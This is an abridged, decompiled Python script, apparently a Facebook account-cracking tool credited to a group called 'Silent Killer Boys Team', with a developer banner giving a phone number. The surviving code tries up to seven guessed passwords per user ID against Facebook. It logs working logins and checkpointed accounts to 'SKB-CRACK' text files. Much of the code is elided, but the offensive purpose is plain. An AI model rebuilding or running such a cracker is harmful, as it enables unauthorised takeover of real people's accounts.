# Decompile by : Md. Alamin Mahamud
# Time Succes decompile : 2022-03-26 17:46:56.379127 

try:	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string	from multiprocessing.pool import ThreadPool
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     ...
     \033[1;92m➣ \033[1;92mDEVOLPER   :            MD. ALAMIN MAHAMUD

     \033[1;91m➣ \033[1;92mFACEBOOK   :            Silent Killer Boys Team (SKB)

     \033[1;93m➣ \033[1;92mWHATSAPP   :            01915935712 

     \033[1;96m➣ \033[1;92mGITHUB     :            ALAMIN-XD89
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q:
				...
				print(" \033[1;31m [SKB-OK] "+uid+" | "+pass1+"\033[0;97m")

				ok = open("SKB-CRACKok.txt", "a")
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					print(" \033[1;32m [SKB-CP] "+uid+" | "+pass1+"\033[0;97m")

					cp = open("SKB-CRACKcp.txt", "a")
					...
					if "access_token" in q:
						...
						print(" \033[1;33m [SKB-OK] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							print(" \033[1;34m [SKB-CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in q:
								...
								print(" \033[1;35m [SKB-OK] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									print(" \033[1;36m [SKB-CP] "+uid+" | "+pass3+"\033[0;97m")
									...
									if "access_token" in q:
										...
										print(" \033[1;31m [SKB-OK] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											print(" \033[1;32m [SKB-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in q:
												...
												print(" \033[1;33m [SKB-OK] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													print(" \033[1;34m [SKB-CP] "+uid+" | "+pass5+"\033[0;97m")
													...
													if "access_token" in q:
														...
														print(" \033[1;35m [SKB-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															print(" \033[1;36m [SKB-CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in q:
																...
																print(" \033[1;31m [SKB-OK] "+uid+" | "+pass7+"\033[0;97m")

																ok = open("SKB-CARCKok.txt", "a")
																...
																if "www.facebook.com" in q["error_msg"]:
																	...
																	print(" \033[1;32m [SKB-CP] "+uid+" | "+pass7+"\033[0;97m")

																	cp = open("SKB-CARCKcp.txt", "a")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q:
				...
				print(" \033[1;32m [SKB-OK] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					print(" \033[1;31m [SKB-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					if "access_token" in q:
						...
						print(" \033[1;36m [SKB-OK] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							print(" \033[1;35m [SKB-CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in q:
								...
								print(" \033[1;34m [SKB-OK] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									print(" \033[1;33m [SKB-CP] "+uid+" | "+pass3+"\033[0;97m")
									...
									if "access_token" in q:
										...
										print(" \033[1;32m [SKB-OK] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											print(" \033[1;31m [SKB-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in q:
												...
												print(" \033[1;36m [SKB-OK] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													print(" \033[1;35m [SKB-CP] "+uid+" | "+pass5+"\033[0;97m")
													...
													if "access_token" in q:
														...
														print(" \033[1;34m [SKB-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															print(" \033[1;23m [SKB-CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in q:
																...
																print(" \033[1;32m [SKB-OK] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in q["error_msg"]:
																	...
																	print(" \033[1;31m [SKB-CP] "+uid+" | "+pass7+"\033[0;97m")
